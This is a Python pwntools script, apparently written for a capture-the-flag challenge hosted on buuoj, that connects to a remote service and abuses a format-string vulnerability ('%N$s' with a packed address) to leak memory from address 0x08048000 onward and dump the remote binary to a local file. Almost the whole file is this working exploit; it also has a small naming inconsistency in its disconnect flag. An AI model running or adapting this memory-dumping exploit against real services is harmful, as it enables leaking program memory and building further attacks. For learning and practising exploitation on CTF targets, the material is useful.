#!/usr/bin/env python
#-*- coding:utf-8 -*-
# Author: I0gan

'''
This is a dump file script
'''

from pwn import *

#context.log_level='debug'
#context(arch = 'i386', os = 'linux', log_level='debug')

exeFile = ''
libFile = '/lib/x86_64-linux-gnu/libc.so.6'

remoteIp = "node3.buuoj.cn"
remotePort = 29458

LOCAL = 1
LIB   = 0

#--------------------------Exploit--------------------------

offset = 8 + 2 + 2

def getbinary():
	data_length = 0x3000
	base_addr = 0x08048000
	end_addr  = base_addr + data_length
	f = open('binary', 'w')
	addr = base_addr
	isDisConnect = False
	disConnectMaxTimes = 3

	io = remote(remoteIp, remotePort)
	for i in range(disConnectMaxTimes):
		io.recvuntil('Please tell me:')
		while addr < end_addr:
			try:
				p = 'ABCDE' # alignment
				p += '%' + str(offset)
				p += '$s'
				p += 'CBAABCD'
				p += p32(addr)
				io.send(p)
				io.recvuntil('ABCDE', drop = True)
				data = io.recvuntil('CBAABCD', drop = True)
				#print data
			except EOFError:
				isDisconnect = True
				io.close()
				break
	
			if len(data) == 0:
				f.write('\x00')
				addr += 1
			else:
				data += '\x00' # string end with '\x00'
				f.write(data)
				addr += len(data)
			if(((addr - base_addr) % 10) == 0):
				print('dumping: ' + str(addr - base_addr) + '/' + str(data_length))
		if isDisconnect == True:
			print('Error.')
			io = remote(remoteIp, remotePort)
			isDisconnect = False
			sleep(0.5)
	

	f.close()
	io.close()

def exploit():
	getbinary()	

#--------------------------Main-----------------------------
if __name__ == '__main__':
	#io = process(exeFile)

	exploit()
